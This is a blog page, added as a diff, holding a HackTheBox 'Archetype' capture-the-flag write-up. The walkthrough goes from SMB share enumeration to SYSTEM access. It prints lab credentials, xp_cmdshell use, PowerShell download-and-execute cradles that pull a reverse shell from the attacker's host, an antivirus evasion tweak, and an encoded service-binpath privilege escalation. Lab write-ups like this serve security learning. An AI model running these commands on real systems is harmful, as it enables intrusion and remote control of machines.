@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HacktheBox - Archetype Writeup | SH∆FIQ ∆IM∆N</title>
+<meta property="og:title" content="HacktheBox - Archetype Writeup | SH∆FIQ ∆IM∆N" />
+<meta name="twitter:title" content="HacktheBox - Archetype Writeup | SH∆FIQ ∆IM∆N" />
+<meta itemprop="name" content="HacktheBox - Archetype Writeup | SH∆FIQ ∆IM∆N" />
+<meta name="application-name" content="HacktheBox - Archetype Writeup | SH∆FIQ ∆IM∆N" />
+<meta property="og:site_name" content="SH∆FIQ ∆IM∆N" />
+
+<meta name="description" content="Minimal Hugo blog theme with light and dark mode support">
+<meta itemprop="description" content="Minimal Hugo blog theme with light and dark mode support" />
+<meta property="og:description" content="Minimal Hugo blog theme with light and dark mode support" />
+<meta name="twitter:description" content="Minimal Hugo blog theme with light and dark mode support" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+
+
+  <meta itemprop="image" content="http://example.com" />
+  <meta property="og:image" content="http://example.com" />
+  <meta name="twitter:image" content="http://example.com" />
+  <meta name="twitter:image:src" content="http://example.com" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2021-07-20T00:00:00Z />
+    <meta property="article:published_time" content=2021-07-20T00:00:00Z />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "HacktheBox - Archetype Writeup",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2021-07-20",
+        "description": "",
+        "wordCount":  481 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2021-07-20",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "SH∆FIQ ∆IM∆N"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.119.0">
+
+    
+
+    <link rel="canonical" href="http://example.com/posts/htb/archetype/">
+    <link href="/style.min.b7e4bda148ee8a6b6e7d052cb6d77374a2dca955a40352c3ccf576dc5f33af2c.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://example.com/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://example.com/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/tags/">
+                        Tags
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/search/">
+                        Search
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HacktheBox - Archetype Writeup</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2021-07-20T00:00:00&#43;00:00" itemprop="datePublished"> 20 Jul 2021 </time>
+                </div>
+                
+            </header>
+                <details class="toc">
+                    <summary><b>Table of Contents</b></summary>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#open-ports">Open ports</a></li>
+      </ul>
+    </li>
+    <li><a href="#smb-enum">SMB Enum</a>
+      <ul>
+        <li><a href="#crackmapexec">CrackMapEXEC</a></li>
+        <li><a href="#smbclient">smbclient</a></li>
+        <li><a href="#proddtsconfig">prod.dtsConfig</a></li>
+      </ul>
+    </li>
+    <li><a href="#footholdgaining-access">Foothold/Gaining Access</a>
+      <ul>
+        <li><a href="#mssqlclientpyimpacket">mssqlclient.py[Impacket]</a></li>
+        <li><a href="#nishang">Nishang</a></li>
+      </ul>
+    </li>
+    <li><a href="#user-flag">User flag</a>
+      <ul>
+        <li><a href="#winpeas">WinPEAS</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#usosvc">UsoSvc</a></li>
+        <li><a href="#modify-service-binary-path">Modify service binary path</a></li>
+        <li><a href="#encoded-command">Encoded Command</a></li>
+      </ul>
+    </li>
+    <li><a href="#administrator-flag">Administrator Flag</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+                </details>
+                <div class="page-content">
+                <h2 id="enumeration">Enumeration</h2>
+<ul>
+<li>1000 ports scan</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">initial</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">27</span><span class="w">
+</span></span></span></code></pre></div><p><img src="1.png" alt="initial nmap scan"></p>
+<ul>
+<li>all ports scan</li>
+</ul>
+<p><img src="2.png" alt="full nmap scan"></p>
+<h3 id="open-ports">Open ports</h3>
+<ul>
+<li>135 (msrpc)</li>
+<li>139 (smb 4 sure)</li>
+<li>445 (smb 4 sure)</li>
+<li>1433 (ms-sql-s/Microsoft SQL Server)</li>
+</ul>
+<h2 id="smb-enum">SMB Enum</h2>
+<h3 id="crackmapexec">CrackMapEXEC</h3>
+<p><img src="3.png" alt="crackmapexec"></p>
+<h3 id="smbclient">smbclient</h3>
+<p><img src="4.png" alt="smbclient"></p>
+<p>wow <code>backups</code> shares. Let&rsquo;s try connect to it.</p>
+<p><img src="5.png" alt="backup shares"></p>
+<ul>
+<li>download the file using the <code>get command</code></li>
+</ul>
+<h3 id="proddtsconfig">prod.dtsConfig</h3>
+<ul>
+<li>content of the file</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="line"><span class="cl"><span class="sr">&lt;DTSConfiguration&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="sr">&lt;DTSConfigurationHeading&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">DTSConfigurationFileInfo</span> <span class="n">GeneratedBy</span><span class="o">=</span><span class="s">&#34;...&#34;</span> <span class="n">GeneratedFromPackageName</span><span class="o">=</span><span class="s">&#34;...&#34;</span> <span class="n">GeneratedFromPackageID</span><span class="o">=</span><span class="s">&#34;...&#34;</span> <span class="n">GeneratedDate</span><span class="o">=</span><span class="s">&#34;20.1.2019 10:01:34&#34;</span><span class="o">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="sr">&lt;/DTSConfigurationHeading&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">Configuration</span> <span class="n">ConfiguredType</span><span class="o">=</span><span class="s">&#34;Property&#34;</span> <span class="n">Path</span><span class="o">=</span><span class="s">&#34;\Package.Connections[Destination].Properties[ConnectionString]&#34;</span> <span class="n">ValueType</span><span class="o">=</span><span class="s">&#34;String&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="sr">&lt;ConfiguredValue&gt;</span><span class="n">Data</span> <span class="n">Source</span><span class="o">=.</span><span class="p">;</span><span class="n">Password</span><span class="o">=</span><span class="n">M3g4c0rp123</span><span class="p">;</span><span class="n">User</span> <span class="n">ID</span><span class="o">=</span><span class="n">ARCHETYPE</span><span class="o">\</span><span class="n">sql_svc</span><span class="p">;</span><span class="n">Initial</span> <span class="n">Catalog</span><span class="o">=</span><span class="n">Catalog</span><span class="p">;</span><span class="n">Provider</span><span class="o">=</span><span class="n">SQLNCLI10</span><span class="mf">.1</span><span class="p">;</span><span class="n">Persist</span> <span class="n">Security</span> <span class="n">Info</span><span class="o">=</span><span class="n">True</span><span class="p">;</span><span class="n">Auto</span> <span class="n">Translate</span><span class="o">=</span><span class="n">False</span><span class="p">;</span><span class="sr">&lt;/ConfiguredValue&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="sr">&lt;/Configuration&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="sr">&lt;/DTSConfiguration&gt;</span>
+</span></span></code></pre></div><p>we&rsquo;ve got the credentials</p>
+<ul>
+<li><code>ARCHETYPE\sql_svc:M3g4c0rp123</code></li>
+</ul>
+<h2 id="footholdgaining-access">Foothold/Gaining Access</h2>
+<h3 id="mssqlclientpyimpacket">mssqlclient.py[Impacket]</h3>
+<ul>
+<li>mssqlclient syntax</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mssqlclient.py &lt;UserID&gt;@&lt;IP addr&gt; -windows-auth
+</span></span></code></pre></div><p><img src="6.png" alt="6"></p>
+<ul>
+<li>always do this after login <code>enable_xp_cmdshell</code></li>
+<li>let&rsquo;s try run <code>whoami</code></li>
+</ul>
+<p><img src="7.png" alt="7"></p>
+<ul>
+<li>Note: I&rsquo;m using <code>xp_cmdshell</code> then <code>whoami</code></li>
+</ul>
+<h3 id="nishang">Nishang</h3>
+<blockquote>
+<p><a href="https://github.com/samratashok/nishang">Nishang</a> is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming.</p>
+</blockquote>
+<ul>
+<li>I&rsquo;m gonna copy the <code>Invoke-PowerShellTcp.ps1</code> into my <code>www</code> directory. Then, rename it to <code>rev.ps1</code></li>
+</ul>
+<p><img src="8.png" alt="8"></p>
+<ul>
+<li>Open the <code>rev.ps1</code> file and pick one of the example. Then <code>copy</code> and <code>paste</code> it on the last line of the code.</li>
+</ul>
+<blockquote>
+<p>Make sure! change the ip and port.</p>
+</blockquote>
+<p><img src="9.png" alt="9"> <em>examples</em></p>
+<p><img src="10.png" alt="10"> <br><em>put in here and save it</em></p>
+<ul>
+<li>Time to upload the script into the machine by using <code>mssqlclient.py</code> that we connected.
+<ul>
+<li>I&rsquo;m gonna run <code>python server</code> inside <code>www</code> directory.</li>
+<li><code>python3 -m http.server</code></li>
+<li>Then try to uploaded using this command:
+<ul>
+<li><code>xp_cmdshell powershell IEX(New-Object Net.WebClient).DownloadString(\&quot;http://10.10.16.13:8000/rev.ps1\&quot;)</code></li>
+</ul>
+</li>
+<li>And this happen</li>
+</ul>
+</li>
+</ul>
+<p><img src="11.png" alt="11"> <br>  <em>it says this script got blocked by antivirus because of this function</em></p>
+<ul>
+<li>So, I change the function into something else. It works.</li>
+</ul>
+<p><img src="12.png" alt="12"></p>
+<h2 id="user-flag">User flag</h2>
+<p><img src="14.png" alt="14"></p>
+<h3 id="winpeas">WinPEAS</h3>
+<ul>
+<li>Upload the winpeas binary into the machine</li>
+<li>I&rsquo;m gonna use <code>powershell</code> to know this machine <code>architecture</code>
+<ul>
+<li>by using this command:
+<ul>
+<li><code>(wmic os get OSArchitecture)[2]</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="13.png" alt="13"></p>
+<ul>
+<li>
+<p>This machine is 64-bit. I&rsquo;m gonna upload <code>WinPEAS 64-bit version</code> to work.</p>
+</li>
+<li>
+<p>I&rsquo;m gonna <code>copy</code> and <code>paste</code> the <code>WinPEAS</code> binary into my <code>www</code> folder.</p>
+</li>
+<li>
+<p>Let&rsquo;s upload it by using this command:</p>
+<ul>
+<li><code>IWR http://10.10.16.13:8000/winPEASx64.exe -OutFile winpeas.exe</code></li>
+</ul>
+</li>
+</ul>
+<p><img src="15.png" alt="15"></p>
+<ul>
+<li>Then run it by using this command <code>.\winpeas.exe</code></li>
+</ul>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="usosvc">UsoSvc</h3>
+<ul>
+<li><code>WinPEAS</code> just found this juicy stuff:</li>
+</ul>
+<p><img src="16.png" alt="16"></p>
+<h3 id="modify-service-binary-path">Modify service binary path</h3>
+<ul>
+<li>According this <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services">link</a></li>
+</ul>
+<blockquote>
+<p>If the group &ldquo;Authenticated users&rdquo; has <em><font color="red">SERVICE_ALL_ACCESS</font></em> in a service, then it can <font color="yellow">modify the binary</font> that is being executed by the service.</p>
+</blockquote>
+<hr>
+<h3 id="encoded-command">Encoded Command</h3>
+<ul>
+<li>Here is the script before Encoded</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">IEX</span><span class="p">(</span><span class="nb">IWR </span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">16</span><span class="p">.</span><span class="mf">13</span><span class="err">:</span><span class="mf">8000</span><span class="p">/</span><span class="n">zzz</span><span class="p">.</span><span class="py">ps1</span> <span class="n">-UseBasicParsing</span><span class="p">)</span>
+</span></span></code></pre></div><ul>
+<li>Time to encoded</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;IEX(IWR http://10.10.16.13:8000/zzz.ps1 -UseBasicParsing)&#34;</span> <span class="p">|</span> iconv -t utf-16le <span class="p">|</span> base64 -w <span class="m">0</span>
+</span></span></code></pre></div><ul>
+<li>First, It&rsquo;s gonna encoded into <code>utf-16le</code></li>
+<li>Second, It&rsquo;s gonna encoded into <code>base64</code></li>
+<li>Sources <a href="https://youtu.be/iyYqgseKUPM?t=2299">IppSec</a></li>
+</ul>
+<hr>
+<ul>
+<li>So, I&rsquo;m gonna <code>copy</code> another <code>powershell reverse shell</code> by name it into <code>zzz.ps1</code></li>
+<li>Then upload it using this command:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">sc</span><span class="p">.</span><span class="py">exe</span> <span class="n">config</span> <span class="n">UsoSvc</span> <span class="n">binpath</span><span class="p">=</span><span class="s2">&#34;cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMQAzADoAOAAwADAAMAAvAHoAegB6AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA=&#34;</span>
+</span></span></code></pre></div><ul>
+<li>After that, run this command <code>sc.exe start UsoSvc</code></li>
+</ul>
+<p><img src="17.png" alt="17"></p>
+<p><img src="18.png" alt="18"> <br> <em>we&rsquo;ve got the reverse shell and become system!</em></p>
+<h2 id="administrator-flag">Administrator Flag</h2>
+<p><img src="19.png" alt="19"></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>I’ve learned a lot of tools today and <code>how to do a PowerShell reverse shell</code>. Ngl, this is a really fun box. I feel like my brain want to explode</p>
+<p>I have a fun time doing this machine and I hope you guys too. Bye ;)</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/hugo-sid" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://twitter.com" target="_blank" rel="noopener noreferrer me"
+    title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+<a href="index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 shafiqaiman.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="http://example.com/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
